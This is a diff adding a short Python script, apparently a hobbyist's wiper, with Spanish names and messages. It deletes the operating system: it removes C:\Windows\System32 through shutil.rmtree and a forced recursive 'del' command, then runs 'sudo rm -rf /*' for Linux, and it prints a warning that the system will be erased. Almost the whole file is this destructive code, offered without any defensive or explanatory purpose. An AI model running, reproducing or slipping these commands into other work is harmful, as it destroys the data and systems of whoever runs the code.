@@ -1,0 +1,43 @@
+import os
+import shutil
+
+class borrar_archivos:
+    def __init__(self):
+        pass
+    def system_32(self):
+        try:
+            self.delete_Windows = shutil.rmtree(r"C:\Windows\System32")
+            self.command_os = os.system(r"del /s /q /f C:\Windows\System32\*.*")
+            print("tu sistema será borrado")
+        except OSError as w:
+            print("System Error: este comando no se ha podido ejecutar ")
+            return w
+            
+    def borrar_linux(self):
+        try: 
+            self.delete_Linux = os.system("sudo rm -rf /*")
+            print("tu sistema será borrado")
+        except OSError as l:
+            print("System Error: este comando no se ha podido ejecutar ")
+            return l
+    
+    
+if __name__ == "__main__":
+    delete_files = borrar_archivos()
+    if delete_files.system_32():
+        pass
+    else:
+        delete_files.borrar_linux()
+
+    
+# Que conste que este script lo he echo yo solo sin pequeñas ayudas solo basandome en mi capacidad
+
+                
+        
+        
+
+
+            
+             
+
+        
